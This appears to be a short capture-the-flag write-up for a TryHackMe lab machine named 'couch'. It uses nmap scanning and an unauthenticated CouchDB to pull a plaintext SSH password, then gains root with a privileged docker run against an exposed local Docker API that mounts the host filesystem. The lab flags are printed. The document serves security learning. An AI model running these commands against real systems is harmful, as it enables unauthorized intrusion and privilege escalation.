## Nmap

```
┌─[✗]─[glack@parrot]─[~/Desktop/THM/couch]
└──╼ $nmap -T5 -p- --min-rate=10000 10.10.138.170
```

```
┌─[glack@parrot]─[~/Desktop/THM/couch]
└──╼ $nmap -sV -sT -p 22,5984 10.10.138.170 -oN couch_nmap.txt
```


```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


## HTTP

1. http://10.10.138.170:5984/


2. https://www.ionos.com/digitalguide/hosting/technical-matters/work-with-couchdb-from-the-command-line/


3. http://10.10.138.170:5984/_all_dbs
```
["_replicator","_users","couch","secret","test_suite_db","test_suite_db2"]
```

I used the browser because curl was not giving any response



4. http://10.10.138.170:5984/_utils
This gave me a GUI for the couchdb

5. The secret database gave me this 


```
{
   "_id": "a1320dd69fb4570d0a3d26df4e000be7",
   "_rev": "2-57b28bd986d343cacd9cb3fca0b20c46",
   "passwordbackup": "atena:t4qfzcc4qN##"
}
```

```
┌─[✗]─[glack@parrot]─[~/Desktop/THM/couch]
└──╼ $ssh atena@10.10.138.170
```

```
atena@ubuntu:~$ id
uid=1000(atena) gid=1000(atena) groups=1000(atena),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```

```
atena@ubuntu:~$ cat user.txt
THM{1ns3cure_couchdb}
```

## Priv ESC

1. After running linpeas i got these potential priv esc vectors

```
╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/home/atena/bin:/home/atena/.
```

2. Used writeup and found out the this command was mentioned in `history`
```
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
```


Reran the command and 

```
atena@ubuntu:~/bin$ docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
/ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

```


```
~ # cd /mnt/root
/mnt/root # ls
root.txt
/mnt/root # cat root.txt
THM{RCE_us1ng_Docker_API}
```


